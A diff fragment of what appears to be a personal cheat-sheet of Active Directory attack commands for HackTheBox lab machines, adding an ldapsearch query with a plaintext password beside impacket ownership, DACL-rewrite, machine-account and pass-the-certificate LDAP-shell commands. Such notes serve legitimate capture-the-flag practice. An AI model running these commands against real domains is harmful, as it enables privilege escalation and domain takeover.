@@ -1499,4 +1499,4 @@ impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'
 impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3' -dc-ip 10.129.40.55﻿
 impacket-addcomputer 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -method LDAPS -computer-name livestep -computer-pass 1loggbz -dc-ip 10.129.229.56﻿
 passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.129.229.56﻿
-
+ldapsearch -H ldap://10.129.25.166 -x -LLL -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"| grep -i info
